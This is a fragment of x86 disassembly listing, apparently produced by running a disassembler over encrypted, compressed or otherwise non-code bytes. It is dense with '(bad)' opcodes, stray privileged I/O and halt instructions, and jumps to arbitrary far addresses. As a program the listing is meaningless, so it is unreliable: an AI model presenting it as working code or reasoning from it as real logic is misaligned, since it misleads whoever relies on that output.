  416d16:	les    edi,FWORD PTR [ebx+eiz*8]
  416d19:	(bad)  
  416d1a:	outs   dx,DWORD PTR ds:[esi]
  416d1b:	in     al,0x47
  416d1d:	out    dx,al
  416d1e:	fidiv  WORD PTR [ebx+esi*4+0x7dc2f33f]
  416d25:	xchg   esi,eax
  416d26:	push   esp
  416d27:	mov    dh,0x14
  416d29:	lods   eax,DWORD PTR ds:[esi]
  416d2a:	lahf   
  416d2b:	ins    DWORD PTR es:[edi],dx
  416d2c:	and    bl,BYTE PTR [ecx-0x12c32098]
  416d32:	aas    
  416d33:	scas   al,BYTE PTR es:[edi]
  416d34:	rol    edi,0x8f
  416d37:	enter  0x9dec,0xfc
  416d3b:	xlat   BYTE PTR ds:[ebx]
  416d3c:	sub    eax,0x4241517a
  416d41:	and    eax,0x58086229
  416d46:	mov    bh,BYTE PTR [esi-0x652925fc]
  416d4c:	mov    edi,?
  416d4e:	inc    eax
  416d4f:	pop    edx
  416d50:	jmp    0x416d95
  416d52:	adc    DWORD PTR [esp+ebx*8+0x16fe9e44],ebx
  416d59:	ds stos BYTE PTR es:[edi],al
  416d5b:	(bad)  
  416d5c:	pop    esp
  416d5d:	repnz test eax,0x8deb0442
  416d63:	repz jmp DWORD PTR [ebx]
  416d66:	imul   ebp,DWORD PTR [ecx+0x6d],0x707c96a
  416d6d:	ss and esi,edi
  416d70:	iret   
  416d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d72:	push   ecx
  416d73:	das    
  416d74:	jns    0x416dea
  416d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d77:	or     ebp,DWORD PTR [ebx]
  416d79:	rcr    BYTE PTR [ebx],1
  416d7b:	into   
  416d7c:	adc    dl,BYTE PTR [ebx-0x5e]
  416d7f:	int    0x52
  416d81:	xchg   edx,eax
  416d82:	stos   BYTE PTR es:[edi],al
  416d83:	push   ecx
  416d84:	sbb    al,cl
  416d86:	sbb    ecx,DWORD PTR [esi-0x49]
  416d89:	or     esi,DWORD PTR [ebp-0x68]
  416d8c:	adc    edi,DWORD PTR [edi-0x2640eed2]
  416d92:	cmc    
  416d93:	mov    dl,0x8d
  416d95:	daa    
  416d96:	push   ebx
  416d97:	jns    0x416da8
  416d99:	xchg   esp,eax
  416d9a:	lods   eax,DWORD PTR ds:[esi]
  416d9b:	or     al,BYTE PTR [ecx-0x7d]
  416d9e:	pop    esp
  416d9f:	mov    dl,0x4a
  416da1:	lock xlat BYTE PTR ds:[ebx]
  416da3:	and    DWORD PTR [ebp+0x6eb97b74],esp
  416da9:	adc    ch,BYTE PTR [eax]
  416dab:	jnp    0x416d6d
  416dad:	loop   0x416e16
  416daf:	sub    eax,0xbef2e935
  416db4:	xor    BYTE PTR [eax+0x10],ah
  416db7:	movnti DWORD PTR [edx+0x2b273e15],edx
  416dbe:	dec    ebp
  416dbf:	repz push edi
  416dc1:	test   al,0xb4
  416dc3:	pushf  
  416dc4:	ins    DWORD PTR es:[edi],dx
  416dc5:	sub    ebp,ebp
  416dc7:	or     ecx,DWORD PTR [edi+0x70]
  416dca:	jmp    0x780d:0x1c5cb725
  416dd1:	aad    0x72
  416dd3:	sub    al,0xe6
  416dd5:	add    ebx,DWORD PTR [esi+esi*2+0x0]
  416dd9:	les    ecx,FWORD PTR [esi+edx*2-0x6066d288]
  416de0:	xor    BYTE PTR [edx],dh
  416de2:	shl    BYTE PTR [ebx+0x663aeb52],0xed
  416de9:	inc    ebx
  416dea:	push   eax
  416deb:	sub    edx,DWORD PTR [eax-0x50]
  416dee:	test   ebx,ebp
  416df0:	mov    dl,ah
  416df2:	shr    DWORD PTR [edi+0x11c9bfd2],cl
  416df8:	test   eax,0x92aff329
  416dfd:	sub    DWORD PTR [ecx+0xe9d17be],esi
  416e03:	mov    ebx,0x1375547c
  416e08:	in     eax,0x51
  416e0a:	push   es
  416e0b:	add    eax,0x6d502442
  416e10:	hlt    
  416e11:	dec    edx
  416e12:	push   ds
  416e13:	pop    esi
  416e14:	js     0x416dce
  416e16:	dec    edx
  416e17:	jmp    0x69d2d561
  416e1c:	scas   eax,DWORD PTR es:[edi]
  416e1d:	xor    eax,0x96346d1c
  416e22:	iret   
  416e23:	out    0x2d,eax
  416e25:	xor    edi,DWORD PTR [eax]
  416e27:	xchg   ecx,eax
  416e28:	push   ss
  416e29:	std    
  416e2a:	imul   esi,DWORD PTR [ecx-0x1fb76ff3],0x50ebf0a
  416e34:	shr    bh,cl
  416e36:	xchg   ecx,eax
  416e37:	fisttp QWORD PTR [eax-0xc]
  416e3a:	jecxz  0x416e9d
  416e3c:	lahf   
  416e3d:	xor    cl,BYTE PTR [esi]
  416e3f:	retf   0x15c5
  416e42:	in     al,0x42
  416e44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e45:	push   edi
  416e46:	mov    ebp,0x79c4a8db
  416e4b:	cmp    eax,0xebec5ac4
  416e50:	cmovs  eax,DWORD PTR [ecx]
  416e53:	pop    esi
  416e54:	and    edi,ecx
  416e56:	test   al,0x4a
  416e58:	stc    
  416e59:	fbld   TBYTE PTR [edi-0x79]
  416e5c:	inc    edi
  416e5d:	inc    esp
  416e5e:	push   ecx
  416e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e60:	fstp   TBYTE PTR [eax+ebp*8]
  416e63:	inc    ecx
  416e64:	rol    DWORD PTR [eax+0x56daec03],1
  416e6a:	sub    edx,DWORD PTR [ecx+0x7a]
  416e6d:	mov    ds:0xd08855ab,al
  416e72:	jno    0x416e63
  416e74:	cmp    DWORD PTR [eax+0x12fb3ef9],edi
  416e7a:	test   DWORD PTR [edi],ecx
  416e7c:	rcl    eax,0x24
  416e7f:	and    edx,DWORD PTR [edi-0x769eea35]
  416e85:	mov    edi,0x59f2baf9
  416e8a:	ror    DWORD PTR [ebp-0x77],1
  416e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e8e:	xor    BYTE PTR [ebx-0x17],ch
  416e91:	(bad)  
  416e92:	shl    DWORD PTR [ebx+0x7c119c44],1
  416e98:	fsub   st(1),st
  416e9a:	pop    DWORD PTR [edi+0x59]
  416e9d:	hlt    
  416e9e:	xchg   ecx,eax
  416e9f:	dec    edi
  416ea0:	(bad)  
  416ea1:	mov    al,0x66
  416ea3:	cmp    edx,esp
  416ea5:	sub    DWORD PTR [esi],esp
  416ea7:	cmp    DWORD PTR cs:[esi],esi
  416eaa:	into   
  416eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416eac:	xor    eax,0x61769a8f
  416eb1:	xchg   BYTE PTR [edi-0x4e88d7f8],dl
  416eb7:	push   esi
  416eb8:	mov    al,ds:0xb6621aad
  416ebd:	dec    edx
  416ebe:	sub    dh,BYTE PTR [eax]
  416ec0:	mov    bh,bl
  416ec2:	inc    ecx
  416ec3:	push   ebp
  416ec4:	jp     0x416f25
  416ec6:	adc    bh,BYTE PTR [eax-0x3d]
  416ec9:	je     0x416ee1
  416ecb:	dec    ecx
  416ecc:	inc    ecx
  416ecd:	mov    ch,0x80
  416ecf:	fisttp DWORD PTR [eax+0x41f955ca]
  416ed5:	push   esp
  416ed6:	out    0x41,eax
  416ed8:	mov    bl,0x5f
  416eda:	xchg   esi,eax
  416edb:	in     eax,dx
  416edc:	sbb    al,0x8b
  416ede:	stc    
  416edf:	xor    ebp,0xfa562f6e
  416ee5:	hlt    
  416ee6:	stos   BYTE PTR es:[edi],al
  416ee7:	nop
  416ee8:	or     ah,dl
  416eea:	cmp    dl,BYTE PTR [ebx-0xed239b4]
  416ef0:	ins    BYTE PTR es:[edi],dx
  416ef1:	or     al,0x4c
  416ef3:	adc    al,BYTE PTR [ebp+0x8]
  416ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ef7:	xor    BYTE PTR [esi+0xe],ch
  416efa:	sbb    DWORD PTR [esp+edi*2+0x56],edi
  416efe:	vmwrite ebp,DWORD PTR [ecx-0x2b]
  416f02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f03:	stos   DWORD PTR es:[edi],eax
  416f04:	imul   ebx,DWORD PTR [ebx+0x5ab82b6c],0x6c6b742f
  416f0e:	ja     0x416ebd
  416f10:	inc    esi
  416f11:	test   eax,0xc7c6f4f1
  416f16:	pop    ebx
  416f17:	pop    ds
  416f18:	push   0x7
  416f1a:	push   esi
  416f1b:	test   eax,0x15a402a
  416f20:	jnp    0x416ef1
  416f22:	fdivrp st(2),st
  416f24:	call   0x3047:0x92743df0
  416f2b:	imul   edi,esi,0xbee7676c
  416f31:	mov    ds:0x77c0a569,eax
  416f36:	int    0xb9
  416f38:	mov    esp,DWORD PTR [ebx]
  416f3a:	clc    
  416f3b:	adc    eax,0x37190df6
  416f40:	mov    al,ds:0x835c7df8
  416f45:	add    ebp,DWORD PTR [ecx+ecx*8+0x52b51e53]
  416f4c:	inc    ebp
  416f4d:	test   bl,0x28
  416f50:	pushf  
  416f51:	adc    al,0x6f
  416f53:	iret   
  416f54:	inc    eax
  416f55:	sub    eax,0xd297f2f8
  416f5a:	aas    
  416f5b:	(bad)  
  416f5c:	in     al,dx
  416f5d:	dec    ecx
  416f5e:	mov    ds:0xda6a24e2,al
  416f63:	sbb    eax,0x8a5bf6d6
  416f68:	popf   
  416f69:	mov    eax,0x364b90f0
  416f6e:	adc    al,0xc8
  416f70:	xor    dh,0xfd
  416f73:	test   DWORD PTR [ecx+0x194ebb2f],0x333ac8ce
  416f7d:	jmp    0xd62a88d8
  416f82:	sbb    al,0x64
  416f84:	out    dx,eax
  416f85:	add    BYTE PTR [edi*4+0x324a0071],0x9c
  416f8d:	sbb    ah,BYTE PTR [edi+0x12]
  416f90:	adc    dl,BYTE PTR [eax-0x21c77c2d]
  416f96:	shl    DWORD PTR [edx-0x7f],1
  416f99:	push   0xca258a18
  416f9e:	xchg   esi,eax
  416f9f:	push   edi
  416fa0:	aas    
  416fa1:	dec    ebx
  416fa2:	in     al,dx
  416fa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fa4:	and    eax,0xc352e3a1
  416fa9:	sub    bh,bh
  416fab:	mov    ah,0xa4
  416fad:	test   BYTE PTR [edi+0x60],cl
  416fb0:	loop   0x416f6f
  416fb2:	pop    esi
  416fb3:	dec    ecx
  416fb4:	(bad)
  416fb7:	xor    eax,0x2e930610
  416fbc:	pop    ds
  416fbd:	xlat   BYTE PTR ds:[ebx]
  416fbe:	sbb    ch,BYTE PTR [edi-0x4e]
  416fc1:	push   ss
  416fc2:	cmp    BYTE PTR [edi],0x45
  416fc5:	inc    esp
  416fc6:	das    
  416fc7:	scas   eax,DWORD PTR es:[edi]
  416fc8:	inc    esp
  416fc9:	nop
  416fca:	fiadd  DWORD PTR [ebx]
  416fcc:	mov    ebx,0xe6912f40
  416fd1:	clc    
  416fd2:	daa    
  416fd3:	sub    BYTE PTR [edx-0x3e],cl
  416fd6:	mov    edx,DWORD PTR [eax]
  416fd8:	jg     0x417044
  416fda:	dec    esp
  416fdb:	stos   DWORD PTR es:[edi],eax
  416fdc:	and    esi,DWORD PTR [ebp+0x26]
  416fdf:	cmp    bl,cl
  416fe1:	pop    edi
  416fe2:	jae    0x417026
  416fe4:	fsub   QWORD PTR [edx+0x3c6ddeb7]
  416fea:	fild   WORD PTR [edx+0x1a21a7aa]
  416ff0:	test   eax,0x54a11dec
  416ff5:	fisubr WORD PTR [edi-0x475b9085]
  416ffb:	aas    
  416ffc:	lods   eax,DWORD PTR ds:[esi]
  416ffd:	inc    edi
  416ffe:	inc    edi
  416fff:	or     dh,BYTE PTR [eax+0x29]
  417002:	sbb    al,0xb1
  417004:	imul   DWORD PTR [eax+0x76]
  417007:	rol    ah,cl
  417009:	les    ebx,FWORD PTR [ebx]
  41700b:	sub    al,BYTE PTR ds:0xafb1a738
  417011:	push   ecx
  417012:	jne    0x416fa2
  417014:	xor    dl,bh
  417016:	loop   0x416ff3
  417018:	mov    DWORD PTR [esi-0x688c5e47],edx
  41701e:	shr    bh,0xb0
  417021:	cli    
  417022:	adc    dh,al
  417024:	(bad)  
  417025:	adc    eax,0x846eaebd
  41702a:	sub    BYTE PTR [edx-0xa8406e],bh
  417030:	call   0x7348b825
  417035:	and    al,0xd2
  417037:	lds    esi,FWORD PTR [ebp-0x5786bca6]
  41703d:	mov    ebx,0x760d09d0
  417042:	bswap  ecx
  417044:	outs   dx,DWORD PTR ds:[esi]
  417045:	icebp  
  417046:	in     al,0x3c
  417048:	push   esi
  417049:	out    dx,al
  41704a:	add    al,0xa6
  41704c:	ins    BYTE PTR es:[edi],dx
  41704d:	push   ebp
  41704e:	add    ebp,DWORD PTR [esi-0x29]
  417051:	dec    edi
  417052:	cwde   
  417053:	pop    ebp
  417054:	scas   eax,DWORD PTR es:[edi]
  417055:	icebp  
  417056:	enter  0x513d,0xaa
  41705a:	sub    DWORD PTR [esi+edx*4-0xc9cc655],ebx
  417061:	adc    al,BYTE PTR [eax]
  417063:	dec    ecx
  417064:	and    dl,BYTE PTR [esi]
  417066:	jmp    0x417018
  417068:	in     eax,0x6c
  41706a:	cmp    esi,ebp
  41706c:	xchg   esi,eax
  41706d:	mov    eax,ds:0x1ffdf02f
  417072:	lock adc ebp,DWORD PTR [eax-0x7afb7beb]
  417079:	mov    bh,0xd
  41707b:	fwait
  41707c:	xchg   esp,eax
  41707d:	jl     0x4170a2
  41707f:	pusha  
  417080:	inc    esp
  417081:	mov    bl,0x6
  417083:	pop    eax
  417084:	pusha  
  417085:	gs repnz in eax,0xbe
  417089:	xor    ch,0x83
  41708c:	fidivr DWORD PTR [edi+edi*4-0x1c]
  417090:	pop    ebp
  417091:	adc    dh,BYTE PTR [ebp-0x5b]
  417094:	adc    al,BYTE PTR [esi+ebp*4-0x25]
  417098:	daa    
  417099:	stc    
  41709a:	mov    al,0x8e
  41709c:	adc    ebp,DWORD PTR [edi]
  41709e:	mov    al,0x54
  4170a0:	clc    
  4170a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170a2:	jnp    0x4170b3
  4170a4:	inc    ebp
  4170a5:	pushf  
  4170a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170a7:	in     al,0x11
  4170a9:	dec    edi
  4170aa:	loopne 0x417099
  4170ac:	rcl    BYTE PTR ds:[ebx-0x627d641],0x34
  4170b4:	xchg   edx,eax
  4170b5:	pushf  
  4170b6:	fld    TBYTE PTR [edx+0x527eeb3c]
  4170bc:	je     0x417118
  4170be:	mov    eax,0x58f2bf14
  4170c3:	leave  
  4170c4:	jb     0x41704f
  4170c6:	sahf   
  4170c7:	js     0x417106
  4170c9:	fidiv  WORD PTR [eax+0x7de64c1]
  4170cf:	repnz mov bh,0x7c
  4170d2:	jno    0x41709a
  4170d4:	je     0x41709f
  4170d6:	push   ss
  4170d7:	fidiv  DWORD PTR [eax+0x5]
  4170da:	add    ecx,DWORD PTR [edi]
  4170dc:	push   ecx
  4170dd:	out    dx,eax
  4170de:	fwait
  4170df:	popa   
  4170e0:	pop    ebx
  4170e1:	shl    edx,1
  4170e3:	hlt    
  4170e4:	cli    
  4170e5:	ins    DWORD PTR es:[edi],dx
  4170e6:	test   DWORD PTR [ecx+0x71e87515],ebx
  4170ec:	pop    ss
  4170ed:	out    dx,eax
  4170ee:	ror    BYTE PTR [edx-0x35906851],1
  4170f4:	mov    dl,0xe0
  4170f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170f7:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170f9:	sar    dl,0x67
  4170fc:	(bad)  
  4170fd:	stos   DWORD PTR es:[edi],eax
  4170fe:	neg    DWORD PTR [ebx]
  417100:	pop    edi
  417101:	scas   al,BYTE PTR es:[edi]
  417102:	data16 into 
  417104:	mov    edi,0x99e25fcd
  417109:	imul   esi
  41710b:	jmp    0x32533a74
  417110:	jb     0x4170c8
  417112:	push   esi
  417113:	mov    bl,0xc2
  417115:	lea    esp,ds:0x38159203
  41711b:	stos   BYTE PTR es:[edi],al
  41711c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41711d:	hlt    
  41711e:	xchg   esp,eax
  41711f:	fcmove st,st(4)
  417121:	pop    ebp
  417122:	(bad)  
  417123:	out    dx,al
  417124:	dec    eax
  417125:	popa   
  417126:	fcmovnu st,st(7)
  417128:	push   ebp
  417129:	das    
  41712a:	mov    esi,DWORD PTR [ecx-0x61867cd5]
  417130:	xchg   edx,eax
  417131:	mov    ah,0x47
  417133:	sbb    ecx,esp
  417135:	pop    ecx
  417136:	xchg   DWORD PTR [eax+0x38],esi
  417139:	test   BYTE PTR [eax-0x4afdb78d],0x52
  417140:	xchg   ebx,eax
  417141:	add    DWORD PTR [ebx],edx
  417143:	jns    0x41711c
  417145:	pushf  
  417146:	popf   
  417147:	ror    DWORD PTR [edi-0x695d29c6],1
  41714d:	mov    ecx,0x249e6079
  417152:	(bad)  
  417153:	shl    BYTE PTR [ebx+0x28],1
  417156:	adc    eax,0x856220e0
  41715b:	aam    0x70
  41715d:	in     al,dx
  41715e:	mov    WORD PTR [edi-0x1a237e2],fs
  417164:	jae    0x41711a
  417166:	jmp    0xb773:0x8cb3b53c
  41716d:	dec    eax
  41716e:	add    eax,0x19
  417171:	mov    cs,esp
  417173:	loopne 0x4171a3
  417175:	sbb    BYTE PTR [ecx+ebp*1],0xf4
  417179:	xor    eax,0xb7c1789c
  41717e:	ja     0x4171b9
  417180:	pop    edx
  417181:	dec    ebp
  417182:	mov    ds:0x97b97eb7,al
  417187:	iret   
  417188:	dec    edi
  417189:	(bad)  
  41718a:	popf   
  41718b:	xor    eax,0x7f72c7a8
  417190:	jno    0x41712e
  417192:	int    0x72
  417194:	cmp    ah,BYTE PTR [ebx]
  417196:	aaa    
  417197:	xchg   edi,eax
  417198:	test   DWORD PTR ds:0xeb53d9d,ebx
  41719e:	in     al,dx
  41719f:	inc    eax
  4171a0:	dec    ebx
  4171a1:	in     al,0xc0
  4171a3:	ret    0xfa4c
  4171a6:	dec    ebx
  4171a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171a8:	cmp    eax,0xa08c866a
  4171ad:	mov    ch,0x57
  4171af:	rcr    DWORD PTR [edx],cl
  4171b1:	mov    WORD PTR [esi*1+0x1e56cb3e],fs
  4171b8:	(bad)  
  4171b9:	fidiv  DWORD PTR ds:[edx+0x28a182cf]
  4171c0:	push   ecx
  4171c1:	loopne 0x41722a
  4171c3:	and    ah,BYTE PTR [ebx-0x799d2449]
  4171c9:	fst    DWORD PTR [ecx+0x69]
  4171cc:	test   DWORD PTR [eax],edx
  4171ce:	pop    esi
  4171cf:	mov    WORD PTR [esi],es
  4171d1:	add    edx,DWORD PTR [ebx-0x79abc448]
  4171d7:	addr16 icebp 
  4171d9:	push   edi
  4171da:	adc    ebx,esi
  4171dc:	popa   
  4171dd:	and    cl,BYTE PTR [eax]
  4171df:	pushf  
  4171e0:	cwde   
  4171e1:	pop    es
  4171e2:	les    edx,FWORD PTR [edi+eax*2+0x2c7afde5]
  4171e9:	lods   eax,DWORD PTR ds:[esi]
  4171ea:	xor    al,0x15
  4171ec:	adc    eax,0x5b0e5329
  4171f1:	mov    ch,0xab
  4171f3:	ret    0x3022
  4171f6:	jo     0x417233
  4171f8:	adc    al,0x4f
  4171fa:	int    0x78
  4171fc:	jo     0x417195
  4171fe:	pop    ds
  4171ff:	adc    eax,0x32371dfb
  417204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417205:	lock inc ebx
  417207:	fistp  WORD PTR [edx]
  417209:	sti    
  41720a:	and    ebx,0xfffffff5
  41720d:	mov    edx,0x9785fcd8
  417212:	xchg   edi,eax
  417213:	(bad)  
  417215:	adc    ebp,ecx
  417217:	lahf   
  417218:	aam    0xb8
  41721a:	mov    dh,0x37
  41721c:	out    dx,al
  41721d:	shl    DWORD PTR [ecx-0x5d],0x76
  417221:	push   es
  417222:	pop    eax
  417223:	dec    edx
  417224:	cld    
  417225:	and    BYTE PTR [esi-0x11f63f64],bl
  41722b:	jp     0x417224
  41722d:	sbb    eax,0x4f417a5f
  417232:	dec    esi
  417233:	mov    dl,0x42
  417235:	sahf   
  417236:	cmp    al,0x9d
  417238:	hlt    
  417239:	inc    edi
  41723a:	mov    bh,0x7
  41723c:	adc    esi,edi
  41723e:	and    BYTE PTR [eax-0x7f],0xb1
  417242:	sub    BYTE PTR [ebx-0x2b6fa80d],0xb0
  417249:	pusha  
  41724a:	retf   0xba7
  41724d:	dec    edx
  41724e:	out    dx,al
  41724f:	rcl    DWORD PTR [esi+0x3e170e8c],0xe1
  417256:	add    ah,BYTE PTR [esi+0x3d]
  417259:	and    BYTE PTR [ebx-0x1c],0x45
  41725d:	lar    edi,WORD PTR [ebx+0x56218fb3]
  417264:	cmp    eax,0xaf6e002
  417269:	aam    0xd2
  41726b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41726c:	jb     0x4172bc
  41726e:	mov    bh,0xb
  417270:	je     0x417266
  417272:	out    dx,eax
  417273:	sub    DWORD PTR [ebx+0x2f],eax
  417276:	aas    
  417277:	loope  0x417277
  417279:	in     eax,0xa8
  41727b:	imul   eax,DWORD PTR [ebx+0x42f3950d],0x38d8af44
  417285:	leave  
  417286:	add    bl,ah
  417288:	sbb    edx,0xffffffc2
  41728b:	lds    esi,FWORD PTR [edx+0x7]
  41728e:	mov    ebp,0xb9bbf301
  417293:	in     al,0x64
  417295:	js     0x417288
  417297:	jne    0x417285
  417299:	and    DWORD PTR [eax-0x68f24437],edx
  41729f:	ins    DWORD PTR es:[edi],dx
  4172a0:	mov    dl,0xc0
  4172a2:	out    dx,al
  4172a3:	mov    ebp,0x5a9172b3
  4172a8:	in     eax,dx
  4172a9:	scas   al,BYTE PTR es:[edi]
  4172aa:	test   al,0xc6
  4172ac:	jl     0x41727d
  4172ae:	sub    eax,0x8231e721
  4172b3:	mov    al,BYTE PTR [edx+0x5c]
  4172b6:	test   BYTE PTR [eax+ebp*4],ah
  4172b9:	ret    0x8be1
  4172bc:	xchg   ebp,eax
  4172bd:	cld    
  4172be:	ja     0x41724d
  4172c0:	lea    eax,[ecx+0x2d]
  4172c3:	pop    ecx
  4172c4:	hlt    
  4172c5:	(bad)  
  4172c7:	daa    
  4172c8:	adc    eax,0x9e1ea91
  4172cd:	pop    ecx
  4172ce:	inc    edx
  4172cf:	aad    0x5a
  4172d1:	in     al,dx
  4172d2:	popf   
  4172d3:	shl    BYTE PTR [ecx],1
  4172d5:	mov    ecx,0x7c8f5ee
  4172da:	pop    ebx
  4172db:	mov    bh,0x66
  4172dd:	das    
  4172de:	add    cl,bl
  4172e0:	lods   al,BYTE PTR ds:[esi]
  4172e1:	and    dl,BYTE PTR [eax]
  4172e3:	or     al,0x43
  4172e5:	leave  
  4172e6:	(bad)  
  4172e7:	lahf   
  4172e8:	shl    BYTE PTR [ebp-0x104c84c],0x35
  4172ef:	mov    eax,ds:0xa8b9df56
  4172f4:	bound  esp,QWORD PTR [ecx]
  4172f6:	rol    BYTE PTR [edx-0x64e7f901],cl
  4172fc:	sahf   
  4172fd:	lods   al,BYTE PTR ds:[esi]
  4172ff:	sub    edi,ecx
  417301:	mov    dl,0x71
  417303:	js     0x4172a5
  417305:	xor    DWORD PTR [ebx+0x59234cda],eax
  41730b:	or     eax,0x8e584870
  417310:	cli    
  417311:	rol    DWORD PTR [eax-0x2b],0x1a
  417315:	jo     0x4172ae
  417317:	call   FWORD PTR [ecx-0x81ae115]
  41731d:	add    ah,BYTE PTR [eax]
  41731f:	outs   dx,BYTE PTR ds:[esi]
  417320:	fwait
  417321:	push   ss
  417322:	ins    DWORD PTR es:[edi],dx
  417323:	scas   eax,DWORD PTR es:[edi]
  417324:	xchg   BYTE PTR [edi+eiz*1],al
  417327:	sbb    DWORD PTR [ecx+0x72e3ff7c],esi
  41732d:	or     ebp,DWORD PTR [esi-0x58237889]
  417333:	sub    ch,BYTE PTR ds:[eax-0x83e0e57]
  41733a:	in     al,dx
  41733b:	repz sbb dl,BYTE PTR [esi-0x58bfadc8]
  417342:	mov    ds:0x78021fd0,eax
  417347:	test   DWORD PTR [ebx+eax*8],ecx
  41734a:	pop    es
  41734b:	aam    0xa4
  41734d:	leave  
  41734e:	int3   
  41734f:	pop    ss
  417350:	fwait
  417351:	aad    0x20
  417353:	or     eax,0xe437a38f
  417358:	lea    ebx,[edi]
  41735a:	pop    ss
  41735b:	push   ecx
  41735c:	mov    eax,DWORD PTR [ebx+esi*4-0x72]
  417360:	je     0x4173b7
  417362:	adc    BYTE PTR [ebp+0x1a],cl
  417365:	and    eax,0x66357b86
  41736a:	pushf  
  41736b:	fnstenv ds:0x5a3cf9ec
  417371:	into   
  417372:	xor    edx,DWORD PTR ds:0xbe6d5429
  417378:	sub    eax,0x736ece5d
  41737d:	jg     0x4173b9
  41737f:	daa    
  417380:	pushf  
  417381:	xor    ah,ah
  417383:	test   eax,0xd44e6810
  417388:	push   ss
  417389:	mov    ebx,0xa80c2b0
  41738e:	xchg   ecx,eax
  41738f:	js     0x4173d0
  417391:	(bad)  
  417392:	jl     0x4173ea
  417394:	jo     0x4173ac
  417396:	test   eax,0xe70289fa
  41739b:	jl     0x417336
  41739d:	mov    cl,0xf0
  41739f:	loopne 0x417396
  4173a1:	mov    edi,0xb03360b4
  4173a6:	lahf   
  4173a7:	pop    esp
  4173a8:	inc    edx
  4173a9:	popf   
  4173aa:	jbe    0x417385
  4173ac:	bound  ebp,QWORD PTR [esi]
  4173ae:	push   esp
  4173af:	mov    esi,0x87aae779
  4173b4:	ret    
  4173b5:	dec    ecx
  4173b6:	jl     0x41733a
  4173b8:	ins    BYTE PTR es:[edi],dx
  4173b9:	and    ebx,DWORD PTR [ebp+ebx*1+0x2f]
  4173bd:	lock loopne 0x417426
  4173c0:	(bad)  
  4173c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173c2:	or     edx,esp
  4173c4:	(bad)  
  4173c6:	xor    dl,BYTE PTR [eax]
  4173c8:	es aad 0xf7
  4173cb:	inc    edx
  4173cc:	frstor [esp+edx*4-0xace7222]
  4173d3:	jbe    0x417421
  4173d5:	adc    edx,DWORD PTR [edx+0x76]
  4173d8:	shr    BYTE PTR [esi],1
  4173da:	arpl   dx,sp
  4173dc:	bound  esi,QWORD PTR [edi]
  4173de:	(bad)  
  4173df:	scas   al,BYTE PTR es:[edi]
  4173e0:	and    dh,dh
  4173e2:	outs   dx,DWORD PTR ds:[esi]
  4173e3:	cmp    edx,DWORD PTR [ebx+0x1a]
  4173e6:	(bad)
  4173e9:	call   0xe2c2:0xb23dcf44
  4173f0:	push   edx
  4173f1:	or     dh,BYTE PTR [esi+0x47]
  4173f4:	add    DWORD PTR [ecx+0x8a2a32b],ecx
  4173fa:	and    BYTE PTR ds:0x2bfcece0,dl
  417400:	mov    al,ds:0x113657eb
  417405:	test   BYTE PTR [eax],0x87
  417408:	into   
  417409:	dec    ebp
  41740a:	dec    esp
  41740b:	test   al,0xfe
  41740d:	mov    ds:0x96ddd0f5,eax
  417412:	(bad)  
  417413:	fstp   st(5)
  417415:	fst    DWORD PTR [ebx]
  417417:	in     al,dx
  417418:	clc    
  417419:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41741a:	pop    ebp
  41741b:	dec    ebp
  41741c:	pop    es
  41741d:	xchg   edi,eax
  41741e:	mov    al,ds:0x38ffc883
  417423:	fisub  WORD PTR [ebp-0x7eddca7c]
  417429:	fwait
  41742a:	call   0x3f2dc3bf
  41742f:	mov    BYTE PTR ds:0xd3230b6d,al
  417435:	test   al,0x9d
  417437:	ss out 0x22,al
  41743a:	sub    dh,BYTE PTR [eax+0x4c7d3364]
  417440:	mov    ebx,0xa3477ae6
  417445:	je     0x41745e
  417447:	in     eax,dx
  417448:	arpl   WORD PTR [edi+0x64],sp
  41744b:	dec    ebx
  41744c:	adc    al,0x10
  41744e:	pushf  
  41744f:	or     DWORD PTR [edx-0x4d],0xafe1f20f
  417456:	cdq    
  417457:	mov    edi,0xc4991520
  41745c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41745d:	jl     0x4173f6
  41745f:	xchg   edx,eax
  417460:	retf   
  417461:	iret   
  417462:	mov    ebp,0xc6bb0e54
  417467:	repnz (bad) 
  417469:	call   0x1f5:0x923649
  417470:	ds repz inc eax
  417473:	mov    ecx,0xb8615e51
  417478:	(bad)  
  417479:	imul   esi,esp,0xffffffe2
  41747c:	stos   BYTE PTR es:[edi],al
  41747d:	push   es
  41747e:	imul   edx,DWORD PTR [edx+0x3],0xfdbe901
  417485:	pop    esp
  417486:	xchg   BYTE PTR [ecx-0x6e],ch
  417489:	or     al,0xe
  41748b:	into   
  41748c:	mov    ebx,0x63c5e34f
  417491:	and    cl,bh
  417493:	std    
  417494:	fild   QWORD PTR [ecx+ecx*8+0x3b]
  417498:	pusha  
  417499:	mov    ecx,0x5cd91897
  41749e:	jmp    0x4174d2
  4174a0:	lea    edi,[esi+0x3f]
  4174a3:	xchg   edi,eax
  4174a4:	mov    esi,0x5cd83d73
  4174a9:	or     al,0xf7
  4174ab:	test   BYTE PTR [ebx],ah
  4174ad:	mov    esi,0x3dd3707e
  4174b2:	adc    DWORD PTR [esi+0x72cf1d3d],esp
  4174b8:	mov    edi,0x9ffd7e0
  4174bd:	sub    BYTE PTR [eax-0x368df011],dl
  4174c3:	mov    al,0x72
  4174c5:	xchg   ecx,eax
  4174c6:	mov    BYTE PTR [ecx+0x15d09326],ch
  4174cc:	das    
  4174cd:	mov    ch,dl
